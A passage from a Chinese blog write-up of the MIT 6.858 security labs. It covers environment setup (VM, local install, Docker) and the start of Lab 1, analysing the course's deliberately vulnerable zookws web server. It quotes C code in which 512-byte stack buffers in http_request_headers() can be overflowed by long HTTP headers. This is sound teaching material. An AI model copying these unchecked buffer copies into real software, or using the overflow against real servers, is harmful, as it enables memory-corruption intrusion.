    <id>http://blog.arttnba3.cn/2022/12/25/EXPR-0X01-MIT_6_858/</id>
    <published>2022-12-24T18:15:28.000Z</published>
    <updated>2022-12-24T18:15:37.843Z</updated>
    
    <content type="html"><![CDATA[<p>不如买个 CTF 课</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00. 一切开始之前"></a>0x00. 一切开始之前</h1><p><a href="http://css.csail.mit.edu/6.858/2022/">MIT 6.858</a> 是面向高年级本科生与研究生开设的一门关于<strong>计算机系统安全</strong>（secure computer security）的课程，内容包括威胁模型（threat models）、危害安全的攻击（attacks that compromise security）、实现安全的技术（techniques for achieving security）</p><p>在 YouTube 上有<a href="https://www.youtube.com/playlist?list=PLUl4u3cNGP62K2DjQLRxDNRi0z2IRWnNh">往年的课程回放</a>，配有英文字幕，不过作为一个并非是对安全一无所知的安全小白，笔者主要还是挑自己不熟悉的那一块跳着听（笑）</p><p>这个课程一共有五个 Lab：</p><ul><li>Lab1：缓冲区溢出（buffer overflow）</li><li>Lab2：权限分离与服务侧沙箱（privilege separation and server-side sandboxing）</li><li>Lab3：符号执行（symbolic execution）</li><li>Lab4：浏览器安全（browser security）</li><li>Lab5：安全的文件系统（secure file system）</li></ul><p>前四个 Lab 主要是基于 MIT 开发的一个叫 <code>zookws</code> 的 web server 完成的</p><h2 id="PRE-环境搭建-amp-amp-说明"><a href="#PRE-环境搭建-amp-amp-说明" class="headerlink" title="PRE. 环境搭建 &amp;&amp; 说明"></a>PRE. 环境搭建 &amp;&amp; 说明</h2><p>这里给出三种搭建实验环境的方式</p><h3 id="Method-I-（推荐）使用-MIT-提供的-VM-镜像"><a href="#Method-I-（推荐）使用-MIT-提供的-VM-镜像" class="headerlink" title="Method I.（推荐）使用 MIT 提供的 VM 镜像"></a>Method I.（推荐）使用 MIT 提供的 VM 镜像</h3><blockquote><p>参见 <a href="http://css.csail.mit.edu/6.858/2022/labs/lab1.html">Lab 1</a></p></blockquote><p>MIT 提供了一个  <a href="https://web.mit.edu/6.858/2022/6.858-x86_64-v22.zip">course VM image</a> ，其中有着一个 Ubuntu 21.10 的系统，登录的用户名为 <code>student</code>，密码为 <code>6858</code>，下载解压后根据自身的本地环境进行对应的操作：</p><ul><li>使用 KVM 运行：直接运行 <strong><code>./6.858-x86_64-v22.sh</code></strong> 即可</li><li>使用 VMware运行：新建虚拟机→稍后安装操作系统→选择系统 <code>Linux &gt; Debian 9.x 64-bit</code> →移除原有虚拟磁盘→添加新的虚拟磁盘→选择  <code>6.858-x86_64-v22.vmdk</code> 即可</li></ul><p>对于非 X86 架构的处理器环境，<del>👴的建议是别做了</del>，在实验手册里推荐安装 qemu ，笔者就不摘抄一遍了</p><p><img src="https://s2.loli.net/2022/12/07/bjhUwo5k9q8EiTJ.png" alt="image.png"></p><p>当然没有图形界面只有一个 tty 比较难受，所以这里还是推荐用 ssh 连上去做，因为虚拟机在本地所以直接 <code>ip addr show dev eth0</code> 找到 IP 后 <code>ssh student@YOUR_IP</code> 就行：</p><p><img src="https://s2.loli.net/2022/12/07/MJcV1zZdS5NvnjE.png" alt="image.png"></p><p>之后还是按惯例把代码拉到本地，并使用 <code>make</code> 构建一下 <code>zookws</code> 看有没有啥问题，没报错就🆗：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">git <span class="hljs-built_in">clone</span> https://web.mit.edu/6858/2022/lab.git</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> lab</span><br><span class="hljs-meta prompt_">lab$ </span><span class="language-bash">make</span><br></code></pre></td></tr></table></figure><p>其中 <code>zookd</code> 负责接收 HTTP 请求，其由 C 编写，HTTP 相关的代码位于 <code>http.c</code> 中，HTTP 协议相关资料<a href="https://www.garshol.priv.no/download/text/http-tut.html">见此处</a></p><p>zookd 有两种版本：</p><ul><li><code>zookd-exstack</code>：栈具有可执行权限</li><li><code>zookd-nxstack</code>：栈不具有可执行权限</li></ul><p>用以进行评分的 <code>zookd</code> 位于 <code>bin.tar.gz</code> 中</p><p>此外，MIT 还提供了一个用以清理环境的 <code>clean-env.sh</code> 脚本，用以确保每次的执行环境都是相同的，我们可以通过如下命令运行 zookd：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">./clean-env.sh ./zookd 8080</span><br></code></pre></td></tr></table></figure><p>之后我们便能在本地的 8080 端口访问到 zookd，直接进去大概会是这个样子：</p><p><img src="https://s2.loli.net/2022/11/29/KUG3v2uoqjm9nZg.png" alt="image.png"></p><h3 id="Method-II-自行配置本地实验环境"><a href="#Method-II-自行配置本地实验环境" class="headerlink" title="Method II. 自行配置本地实验环境"></a>Method II. 自行配置本地实验环境</h3><p>首先是配环境，除了 <code>pwntools</code> 是笔者个人比较喜欢的一个编写 exp 的模块以外其他都是实验环境必须的：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo atp-get install -y curl strace lxc-dev</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo pip3 install sqlalchemy pwntools flask z3-solver angr bytecode lxc</span><br></code></pre></td></tr></table></figure><p>之后还是按惯例把代码拉到本地，并使用 <code>make</code> 构建一下 <code>zookws</code> 看有没有啥问题，没报错就🆗：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">git <span class="hljs-built_in">clone</span> https://web.mit.edu/6858/2022/lab.git</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> lab</span><br><span class="hljs-meta prompt_">lab$ </span><span class="language-bash">make</span><br></code></pre></td></tr></table></figure><h3 id="Method-III-使用-docker-搭建实验环境"><a href="#Method-III-使用-docker-搭建实验环境" class="headerlink" title="Method III.使用 docker 搭建实验环境"></a>Method III.使用 docker 搭建实验环境</h3><p>因为评测用的二进制文件需要用较高版本的 libc（例如笔者用的就是 Ubuntu 20.04 with 过时的 libc2.31），同时也避免污染本地环境，因此使用 Docker 来完成实验也是一个需求项</p><blockquote><p>Dockerfile，注意替换上自己的公钥，如果没有从外部连接容器的需求的话这一步可以跳过</p></blockquote><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> ubuntu:<span class="hljs-number">22.04</span><br><br><span class="hljs-comment"># basic environment</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> sed -i <span class="hljs-string">&quot;s/http:\/\/archive.ubuntu.com/http:\/\/mirrors.tuna.tsinghua.edu.cn/g&quot;</span> /etc/apt/sources.list &amp;&amp; \</span><br><span class="language-bash">    apt-get update &amp;&amp; apt-get -y dist-upgrade &amp;&amp; \</span><br><span class="language-bash">    DEBIAN_FRONTEND=noninteractive \</span><br><span class="language-bash">    apt-get install -y git python3-pip tmux vim curl openssh-server strace gdb lxc lxc-dev</span><br><br><span class="hljs-comment"># sqlalchemy for lab, pwntools for my own</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> pip3 config <span class="hljs-built_in">set</span> global.index-url https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> pip3 install sqlalchemy pwntools flask z3-solver angr bytecode lxc</span><br><br><span class="hljs-comment"># pwndbg for a better debug experience</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">cd</span> /root &amp;&amp; \</span><br><span class="language-bash">    git <span class="hljs-built_in">clone</span> https://github.com/pwndbg/pwndbg &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">cd</span> /root/pwndbg &amp;&amp; \</span><br><span class="language-bash">    ./setup.sh</span><br><br><span class="hljs-comment"># I&#x27;d like to make a new user for it</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> useradd -m student</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> usermod -s /bin/bash student</span><br><br><span class="hljs-comment"># clone the lab</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">cd</span> /home/student &amp;&amp; \</span><br><span class="language-bash">    git <span class="hljs-built_in">clone</span> https://web.mit.edu/6858/2022/lab.git &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">chown</span> -R student:student ./lab</span><br><br><span class="hljs-comment"># make your ssh key authorized</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">mkdir</span> /home/student/.ssh &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;这里写你的ssh公钥&quot;</span> &gt; /home/student/.ssh/authorized_keys</span><br><br><span class="hljs-comment"># start ssh service and keep container running continuously</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;#!/bin/bash\nservice ssh start\nsleep infinity&quot;</span> &gt; /root/start.sh &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">chmod</span> +x /root/start.sh</span><br><br><span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;/root/start.sh&quot;</span>]</span><br></code></pre></td></tr></table></figure><p>因为实验要关 ASLR 所以我们在启动 docker 时需要 <code>--privileged</code>，不过因为只是实验用的容器所以无所谓，同时为了外网能访问到所以这里配了几个端口转发：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo docker build -t <span class="hljs-string">&quot;mit_6858_img&quot;</span> .</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo docker run -d --privileged -p <span class="hljs-string">&quot;8080:8080&quot;</span> -p <span class="hljs-string">&quot;2022:22&quot;</span> -h <span class="hljs-string">&quot;mit_6858_docker&quot;</span> --name=<span class="hljs-string">&quot;mit_6858&quot;</span> mit_6858_img</span><br></code></pre></td></tr></table></figure><p>之后我们便能直接进到容器内部继续实验：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo docker <span class="hljs-built_in">exec</span> -it mit_6858 /bin/bash</span><br></code></pre></td></tr></table></figure><p>也可以通过 ssh 进行远程连接：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">ssh student@your_server_ip -p 2022</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/12/03/RqEPmQyLzUskg4e.png" alt="image.png"></p><h3 id="EXTRA-vscode-连接"><a href="#EXTRA-vscode-连接" class="headerlink" title="EXTRA.vscode 连接"></a>EXTRA.vscode 连接</h3><p>因为我们的实验环境都有 ssh，所以直接用 vscode 通过 ssh 连接是非常方便的一件事情（容器配上端口转发也可以连接）</p><p> 首先在扩展里找到 ssh 插件并安装</p><p><img src="https://s2.loli.net/2022/12/03/VlTkD8N5BPFUq7v.png" alt="image.png"></p><p>添加 host 信息</p><p><img src="https://s2.loli.net/2022/12/03/U4ORh8JaWXulVB2.png" alt="image.png"></p><p>之后直接连接上去就行了</p><p><img src="https://s2.loli.net/2022/12/03/vNnUWPgELZIByY4.png" alt="image.png"></p><h1 id="0x01-Lab1-Buffer-overflows"><a href="#0x01-Lab1-Buffer-overflows" class="headerlink" title="0x01. Lab1: Buffer overflows"></a>0x01. Lab1: Buffer overflows</h1><h2 id="Part-1-Finding-buffer-overflows"><a href="#Part-1-Finding-buffer-overflows" class="headerlink" title="Part 1: Finding buffer overflows"></a>Part 1: Finding buffer overflows</h2><p>首先给了一个资料：<a href="https://thesquareplanet.com/blog/smashing-the-stack-21st-century/">Smashing the stack in the 21st century</a>，基础薄弱的同学可以仔细看看，笔者这里直接跳过，然后是 Exercise 1：</p><blockquote><p><strong>Exercise 1.</strong> Study the web server’s C code (in <code>zookd.c</code> and <code>http.c</code>), and find one example of code that allows an attacker to overwrite the return address of a function. Hint: look for buffers allocated on the stack. Write down a description of the vulnerability in the file <code>answers.txt</code>. For your vulnerability, describe the buffer which may overflow, how you would structure the input to the web server (i.e., the HTTP request) to overflow the buffer and overwrite the return address, and the call stack that will trigger the buffer overflow (i.e., the chain of function calls starting from <code>process_client</code>).</p><p>It is worth taking your time on this exercise and familiarizing yourself with the code, because your next job is to exploit the vulnerability you identified. In fact, you may want to go back and forth between this exercise and later exercises, as you work out the details and document them. That is, if you find a buffer overflow that you think can be exploited, you can use later exercises to figure out if it indeed can be exploited. It will be helpful to draw a stack diagram like the figures in <a href="https://thesquareplanet.com/blog/smashing-the-stack-21st-century/">Smashing the Stack in the 21st Century</a>.</p></blockquote><p>大概是阅读  <code>zookd.c</code> 和 <code>http.c</code> 找漏洞，提示关注在栈上分配的 buffer，并将答案写在 <code>answers.txt</code> 中<del>（👴：❓）</del></p><p>首先看 <code>zookd.c</code>，源码比较简洁，核心逻辑在 <code>run_server()</code> 中，首先会调用 <code>start_server()</code> 创建一个 http 服务器，之后在 <code>run_server()</code> 中有一个无限循环调用 <code>accept()</code> 接收请求后 <code>fork()</code> 出子进程调用 <code>process_client()</code> 处理</p><h4 id="process-client-：处理单次-HTTP-request"><a href="#process-client-：处理单次-HTTP-request" class="headerlink" title="process_client()：处理单次 HTTP request"></a>process_client()：处理单次 HTTP request</h4><p> <code>process_client()</code> 的逻辑也比较简单，主要是调用 <code>http_request_line()</code> 获取请求头第一行，之后给到 <code>env_deserialize()</code> 解析环境变量，之后调用 <code>http_request_headers()</code> 解析剩下的 header，最后调用 <code>http_serve()</code> 处理</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">process_client</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span><br>&#123;<br>    <span class="hljs-type">static</span> <span class="hljs-type">char</span> env[<span class="hljs-number">8192</span>];  <span class="hljs-comment">/* static variables are not on the stack */</span><br>    <span class="hljs-type">static</span> <span class="hljs-type">size_t</span> env_len = <span class="hljs-number">8192</span>;<br>    <span class="hljs-type">char</span> reqpath[<span class="hljs-number">4096</span>];<br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *errmsg;<br><br>    <span class="hljs-comment">/* get the request line */</span><br>    <span class="hljs-keyword">if</span> ((errmsg = http_request_line(fd, reqpath, env, &amp;env_len)))<br>        <span class="hljs-keyword">return</span> http_err(fd, <span class="hljs-number">500</span>, <span class="hljs-string">&quot;http_request_line: %s&quot;</span>, errmsg);<br><br>    env_deserialize(env, <span class="hljs-keyword">sizeof</span>(env));<br><br>    <span class="hljs-comment">/* get all headers */</span><br>    <span class="hljs-keyword">if</span> ((errmsg = http_request_headers(fd)))<br>      http_err(fd, <span class="hljs-number">500</span>, <span class="hljs-string">&quot;http_request_headers: %s&quot;</span>, errmsg);<br>    <span class="hljs-keyword">else</span><br>      http_serve(fd, getenv(<span class="hljs-string">&quot;REQUEST_URI&quot;</span>));<br><br>    close(fd);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="http-request-line-：解析-header-第一行"><a href="#http-request-line-：解析-header-第一行" class="headerlink" title="http_request_line()：解析 header 第一行"></a>http_request_line()：解析 header 第一行</h4><p>现在来看 <code>http_request_line()</code>，其首先调用了一个函数 <code>http_read_line()</code> 从 TCP 连接中读取一整行（read() 一个字节一个字节地读，一直读到 <code>\n</code> 并返回读取的字节数，对于 <code>\r</code> 自动跳过，失败则返回 <code>-1</code>，代码就不贴了）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-type">char</span> *<span class="hljs-title function_">http_request_line</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">char</span> *reqpath, <span class="hljs-type">char</span> *env, <span class="hljs-type">size_t</span> *env_len)</span><br>&#123;<br>    <span class="hljs-type">static</span> <span class="hljs-type">char</span> buf[<span class="hljs-number">8192</span>];      <span class="hljs-comment">/* static variables are not on the stack */</span><br>    <span class="hljs-type">char</span> *sp1, *sp2, *qp, *envp = env;<br><br>    <span class="hljs-comment">/* For lab 2: don&#x27;t remove this line. */</span><br>    touch(<span class="hljs-string">&quot;http_request_line&quot;</span>);<br><br>    <span class="hljs-keyword">if</span> (http_read_line(fd, buf, <span class="hljs-keyword">sizeof</span>(buf)) &lt; <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Socket IO error&quot;</span>;<br></code></pre></td></tr></table></figure><p>之后解析路径与请求类型，主要就是用 <code>strchr()</code> 进行分隔后判断，并将结果写到 <code>env</code> 中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Parse request like &quot;GET /foo.html HTTP/1.0&quot; */</span><br>sp1 = <span class="hljs-built_in">strchr</span>(buf, <span class="hljs-string">&#x27; &#x27;</span>);<br><span class="hljs-keyword">if</span> (!sp1)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Cannot parse HTTP request (1)&quot;</span>;<br>*sp1 = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>sp1++;<br><span class="hljs-keyword">if</span> (*sp1 != <span class="hljs-string">&#x27;/&#x27;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Bad request path&quot;</span>;<br><br>sp2 = <span class="hljs-built_in">strchr</span>(sp1, <span class="hljs-string">&#x27; &#x27;</span>);<br><span class="hljs-keyword">if</span> (!sp2)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Cannot parse HTTP request (2)&quot;</span>;<br>*sp2 = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>sp2++;<br><br><span class="hljs-comment">/* We only support GET and POST requests */</span><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;GET&quot;</span>) &amp;&amp; <span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;POST&quot;</span>))<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Unsupported request (not GET or POST)&quot;</span>;<br><br>envp += <span class="hljs-built_in">sprintf</span>(envp, <span class="hljs-string">&quot;REQUEST_METHOD=%s&quot;</span>, buf) + <span class="hljs-number">1</span>;<br>envp += <span class="hljs-built_in">sprintf</span>(envp, <span class="hljs-string">&quot;SERVER_PROTOCOL=%s&quot;</span>, sp2) + <span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><p>然后解析请求中的参数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* parse out query string, e.g. &quot;foo.py?user=bob&quot; */</span><br><span class="hljs-keyword">if</span> ((qp = <span class="hljs-built_in">strchr</span>(sp1, <span class="hljs-string">&#x27;?&#x27;</span>)))<br>&#123;<br>    *qp = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>    envp += <span class="hljs-built_in">sprintf</span>(envp, <span class="hljs-string">&quot;QUERY_STRING=%s&quot;</span>, qp + <span class="hljs-number">1</span>) + <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>之后调用 <code>url_decode(dst, src)</code> 解析 request URL，这个函数主要就是把 URL 里的 <code>%ab</code> 换成 <code>0xab</code> ，把 <code>+</code> 换成 空格，由 <code>src</code> 拷贝到 <code>dst</code> ；最后将结果写回 <code>env</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">    <span class="hljs-comment">/* decode URL escape sequences in the requested path into reqpath */</span><br>    url_decode(reqpath, sp1);<br><br>    envp += <span class="hljs-built_in">sprintf</span>(envp, <span class="hljs-string">&quot;REQUEST_URI=%s&quot;</span>, reqpath) + <span class="hljs-number">1</span>;<br><br>    envp += <span class="hljs-built_in">sprintf</span>(envp, <span class="hljs-string">&quot;SERVER_NAME=zoobar.org&quot;</span>) + <span class="hljs-number">1</span>;<br><br>    *envp = <span class="hljs-number">0</span>;<br>    *env_len = envp - env + <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="http-request-headers-：解析-header-剩余部分（存在漏洞）"><a href="#http-request-headers-：解析-header-剩余部分（存在漏洞）" class="headerlink" title="http_request_headers()：解析 header 剩余部分（存在漏洞）"></a>http_request_headers()：解析 header 剩余部分（存在漏洞）</h4><p>进来首先是一个大循环，每次循环都会调用 <code>http_read_line()</code> 读取一行 header 进行解析：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-type">char</span> *<span class="hljs-title function_">http_request_headers</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span><br>&#123;<br>    <span class="hljs-type">static</span> <span class="hljs-type">char</span> buf[<span class="hljs-number">8192</span>];      <span class="hljs-comment">/* static variables are not on the stack */</span><br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-type">char</span> value[<span class="hljs-number">512</span>];<br>    <span class="hljs-type">char</span> envvar[<span class="hljs-number">512</span>];<br><br>    <span class="hljs-comment">/* For lab 2: don&#x27;t remove this line. */</span><br>    touch(<span class="hljs-string">&quot;http_request_headers&quot;</span>);<br><br>    <span class="hljs-comment">/* Now parse HTTP headers */</span><br>    <span class="hljs-keyword">for</span> (;;)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (http_read_line(fd, buf, <span class="hljs-keyword">sizeof</span>(buf)) &lt; <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Socket IO error&quot;</span>;<br><br>        <span class="hljs-keyword">if</span> (buf[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;\0&#x27;</span>)     <span class="hljs-comment">/* end of headers */</span><br>            <span class="hljs-keyword">break</span>;<br></code></pre></td></tr></table></figure><p>之后是解析 <code>key: value</code> 型的值，首先是 <code>shrchr()</code> 按空格进行分割，然后将 <code>key</code> 转成大写且 <code>-</code> 转成 <code>_</code> ，之后调用 <code>url_decode()</code> 解析</p><ul><li>这里我们注意到 <code>value</code> 是一个<strong>位于函数栈上的字符数组，长度仅为 512</strong>，而该 HTTP server 所允许的单行最大长度为 8192 字符，这意味着<strong>我们可以很轻易地通过传入一个较长的键值对参数来完成栈溢出</strong></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Parse things like &quot;Cookie: foo bar&quot; */</span><br><span class="hljs-type">char</span> *sp = <span class="hljs-built_in">strchr</span>(buf, <span class="hljs-string">&#x27; &#x27;</span>);<br><span class="hljs-keyword">if</span> (!sp)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Header parse error (1)&quot;</span>;<br>*sp = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>sp++;<br><br><span class="hljs-comment">/* Strip off the colon, making sure it&#x27;s there */</span><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">strlen</span>(buf) == <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Header parse error (2)&quot;</span>;<br><br><span class="hljs-type">char</span> *colon = &amp;buf[<span class="hljs-built_in">strlen</span>(buf) - <span class="hljs-number">1</span>];<br><span class="hljs-keyword">if</span> (*colon != <span class="hljs-string">&#x27;:&#x27;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Header parse error (3)&quot;</span>;<br>*colon = <span class="hljs-string">&#x27;\0&#x27;</span>;<br><br><span class="hljs-comment">/* Set the header name to uppercase and replace hyphens with underscores */</span><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>(buf); i++) &#123;<br>    buf[i] = <span class="hljs-built_in">toupper</span>(buf[i]);<br>    <span class="hljs-keyword">if</span> (buf[i] == <span class="hljs-string">&#x27;-&#x27;</span>)<br>        buf[i] = <span class="hljs-string">&#x27;_&#x27;</span>;<br>&#125;<br><br><span class="hljs-comment">/* Decode URL escape sequences in the value */</span><br>url_decode(value, sp);<br></code></pre></td></tr></table></figure><p>最后部分就是如果 <code>key</code> 不为 <code>CONTENT_TYPE</code> 或 <code>CONTENT_LENGTH</code> 则在前面加上字符串 <code>HTTP_</code> 后存储到 <code>envvar</code> 中，并调用 <code>setenv()</code> 设置  <em>环境变量</em>  中的对应值</p><ul><li>这里我们注意到 <code>envvar</code> 也是一个<strong>位于函数栈上的长度仅为 512的字符数组</strong>，因此在这里也可以发生<strong>栈溢出</strong></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c">        <span class="hljs-comment">/* Store header in env. variable for application code */</span><br>        <span class="hljs-comment">/* Some special headers don&#x27;t use the HTTP_ prefix. */</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;CONTENT_TYPE&quot;</span>) != <span class="hljs-number">0</span> &amp;&amp;<br>            <span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;CONTENT_LENGTH&quot;</span>) != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">sprintf</span>(envvar, <span class="hljs-string">&quot;HTTP_%s&quot;</span>, buf);<br>            setenv(envvar, value, <span class="hljs-number">1</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            setenv(buf, value, <span 